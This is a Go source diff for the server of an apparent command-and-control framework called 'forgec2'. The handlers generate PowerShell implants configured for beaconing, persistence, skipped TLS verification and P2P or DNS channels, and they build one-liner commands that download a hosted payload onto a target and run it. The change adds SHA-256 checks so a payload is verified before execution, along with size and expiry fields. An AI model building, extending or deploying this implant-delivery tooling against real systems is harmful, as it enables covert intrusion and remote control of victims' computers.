@@ -1,16 +1,30 @@
 package server
 
 import (
+	"crypto/sha256"
+	"encoding/hex"
 	"fmt"
 	"net/http"
 	"os"
 	"path/filepath"
+	"time"
 
 	"github.com/forgec2/forgec2/internal/obfuscation"
 	"github.com/forgec2/forgec2/internal/payload"
-	"github.com/gin-gonic/gin"
 	"github.com/forgec2/forgec2/internal/util"
+	"github.com/gin-gonic/gin"
 )
+
+// sha256OfFile returns the hex SHA-256 and size of the hosted payload so
+// operators can verify resumed/relayed downloads before executing them.
+func sha256OfFile(path string) (string, int64) {
+	data, err := os.ReadFile(path)
+	if err != nil {
+		return "", 0
+	}
+	sum := sha256.Sum256(data)
+	return hex.EncodeToString(sum[:]), int64(len(data))
+}
 
 func (s *Server) handleGeneratePS1(c *gin.Context) {
 	var form struct {
@@ -65,23 +79,23 @@ func (s *Server) handleGeneratePS1(c *gin.Context) {
 	}
 
 	cfg := payload.ImplantConfig{
-		C2URL:          form.C2URL,
-		Protocol:       form.Protocol,
+		C2URL:           form.C2URL,
+		Protocol:        form.Protocol,
 		BeaconTransport: resolved.BeaconTransport,
-		Interval:       interval,
-		Jitter:         form.Jitter,
-		UserAgent:      form.UserAgent,
-		Persist:        form.Persist,
-		SkipTLSVerify:  form.SkipTLSVerify,
-		Filename:       form.Filename,
-		Debug:          false,
-		Profile:       form.Profile,
-		ListenerID:    form.ListenerID,
-		Proxy:         form.Proxy,
-		CryptoKey:     form.CryptoKey,
-		BeaconKey:     beaconKey,
-		RegSecretID:   regSecretID,
-		RegSecret:     regSecretB64,
+		Interval:        interval,
+		Jitter:          form.Jitter,
+		UserAgent:       form.UserAgent,
+		Persist:         form.Persist,
+		SkipTLSVerify:   form.SkipTLSVerify,
+		Filename:        form.Filename,
+		Debug:           false,
+		Profile:         form.Profile,
+		ListenerID:      form.ListenerID,
+		Proxy:           form.Proxy,
+		CryptoKey:       form.CryptoKey,
+		BeaconKey:       beaconKey,
+		RegSecretID:     regSecretID,
+		RegSecret:       regSecretB64,
 	}
 
 	ps1Code, err := payload.GeneratePowerShellSource(cfg, s.implantDataDir())
@@ -105,26 +119,26 @@ func (s *Server) handleGeneratePS1(c *gin.Context) {
 // handleGenerateOneLiner generates a payload and returns 10+ one-liner variants
 func (s *Server) handleGenerateOneLiner(c *gin.Context) {
 	var form struct {
-		C2URL            string `form:"c2_url"`
-		Protocol         string `form:"protocol"`
-		BeaconTransport  string `form:"beacon_transport"`
-		Interval         int    `form:"interval"`
-		Jitter           int    `form:"jitter"`
-		BeaconTime       int    `form:"beacon_time"`
-		UserAgent        string `form:"user_agent"`
-		Persist          bool   `form:"persist"`
-		SkipTLSVerify    bool   `form:"skip_tls_verify"`
-		Profile          string `form:"profile"`
-		ListenerID       uint   `form:"listener_id"`
-		PayloadType      string `form:"payload_type"` // "exe", "ps1", "linux"
-		Proxy            string `form:"proxy"`
-		CryptoKey        string `form:"crypto_key"`
-		BeaconKey        string `form:"beacon_key"`
-		P2PMode          string `form:"p2p_mode"`
-		P2PParent        string `form:"p2p_parent"`
-		P2PListenAddr    string `form:"p2p_listen_addr"`
-		DNSDomain        string `form:"dns_domain"`
-		DNSServer        string `form:"dns_server"`
+		C2URL           string `form:"c2_url"`
+		Protocol        string `form:"protocol"`
+		BeaconTransport string `form:"beacon_transport"`
+		Interval        int    `form:"interval"`
+		Jitter          int    `form:"jitter"`
+		BeaconTime      int    `form:"beacon_time"`
+		UserAgent       string `form:"user_agent"`
+		Persist         bool   `form:"persist"`
+		SkipTLSVerify   bool   `form:"skip_tls_verify"`
+		Profile         string `form:"profile"`
+		ListenerID      uint   `form:"listener_id"`
+		PayloadType     string `form:"payload_type"` // "exe", "ps1", "linux"
+		Proxy           string `form:"proxy"`
+		CryptoKey       string `form:"crypto_key"`
+		BeaconKey       string `form:"beacon_key"`
+		P2PMode         string `form:"p2p_mode"`
+		P2PParent       string `form:"p2p_parent"`
+		P2PListenAddr   string `form:"p2p_listen_addr"`
+		DNSDomain       string `form:"dns_domain"`
+		DNSServer       string `form:"dns_server"`
 	}
 	if err := c.ShouldBind(&form); err != nil {
 		respondError(c, http.StatusBadRequest, "Invalid request parameters")
@@ -196,28 +210,28 @@ func (s *Server) handleGenerateOneLiner(c *gin.Context) {
 	}
 
 	cfg := payload.ImplantConfig{
-		C2URL:            form.C2URL,
-		Protocol:         form.Protocol,
-		BeaconTransport:  form.BeaconTransport,
-		Interval:         interval,
-		Jitter:           form.Jitter,
-		UserAgent:        form.UserAgent,
-		Persist:          form.Persist,
-		SkipTLSVerify:    form.SkipTLSVerify,
-		Filename:         "forgec2_beacon",
-		Debug:            false,
-		Profile:          form.Profile,
-		ListenerID:       form.ListenerID,
-		P2PMode:          p2pMode,
-		P2PParent:        p2pParent,
-		P2PListenAddr: p2pListenAddr,
-		DNSDomain:     form.DNSDomain,
-		DNSServer:     form.DNSServer,
-		Proxy:         form.Proxy,
-		CryptoKey:     form.CryptoKey,
-		BeaconKey:     beaconKey,
-		RegSecretID:   regSecretID,
-		RegSecret:     regSecretB64,
+		C2URL:           form.C2URL,
+		Protocol:        form.Protocol,
+		BeaconTransport: form.BeaconTransport,
+		Interval:        interval,
+		Jitter:          form.Jitter,
+		UserAgent:       form.UserAgent,
+		Persist:         form.Persist,
+		SkipTLSVerify:   form.SkipTLSVerify,
+		Filename:        "forgec2_beacon",
+		Debug:           false,
+		Profile:         form.Profile,
+		ListenerID:      form.ListenerID,
+		P2PMode:         p2pMode,
+		P2PParent:       p2pParent,
+		P2PListenAddr:   p2pListenAddr,
+		DNSDomain:       form.DNSDomain,
+		DNSServer:       form.DNSServer,
+		Proxy:           form.Proxy,
+		CryptoKey:       form.CryptoKey,
+		BeaconKey:       beaconKey,
+		RegSecretID:     regSecretID,
+		RegSecret:       regSecretB64,
 	}
 
 	agentsDir := filepath.Join(s.cfg.Server.DataDir, "agents")
@@ -305,8 +319,10 @@ func (s *Server) handleGenerateOneLiner(c *gin.Context) {
 	baseURL := fmt.Sprintf("%s://%s", scheme, c.Request.Host)
 	payloadURL := fmt.Sprintf("%s/payloads/%s/%s", baseURL, payloadID, filename)
 
-	// Generate one-liner variants
-	oneLiners := buildOneLiners(payloadType, ps1Code, payloadURL, hostPath, form.Proxy)
+	// Generate one-liner variants (verified variants carry the SHA-256 so the
+	// target validates the payload after download/resume, before executing).
+	payloadSHA, payloadSize := sha256OfFile(hostPath)
+	oneLiners := buildOneLiners(payloadType, ps1Code, payloadURL, hostPath, form.Proxy, payloadSHA)
 
 	// The original build artifact in data/agents is a duplicate of the hosted
 	// payload copy and is never served again — register it for reaping.
@@ -320,6 +336,9 @@ func (s *Server) handleGenerateOneLiner(c *gin.Context) {
 		"payload_id":   payloadID,
 		"filename":     filename,
 		"download_url": payloadURL,
+		"sha256":       payloadSHA,
+		"size":         payloadSize,
+		"expires_at":   time.Now().Add(HostedPayloadTTL).UTC().Format(time.RFC3339),
 		"types":        oneLiners,
 	})
 }
